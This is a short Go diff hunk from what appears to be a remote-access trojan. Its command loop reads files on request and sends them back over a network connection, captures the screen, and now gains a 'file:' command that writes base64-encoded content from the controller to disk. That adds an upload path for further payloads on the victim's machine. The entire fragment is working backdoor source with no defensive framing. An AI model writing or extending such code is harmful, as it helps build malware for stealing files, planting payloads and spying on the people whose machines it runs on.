@@ -55,6 +55,11 @@ func main() {
 				tgt_file := strings.Split(cmd, " ")[1]
 				send_msg(conn, read_file(tgt_file))
 			}
+		} else if strings.Split(cmd, ":")[0] == "file"  { 
+			b64_content := strings.Split(cmd, ":")[1]
+			file_name := strings.Split(cmd, ":")[2]
+			result := save_file(file_name, b64_content)
+			send_msg(conn, result)
 		} else if cmd == "capturescr" {
 			result := capture_scr()
 			send_msg(conn, result)
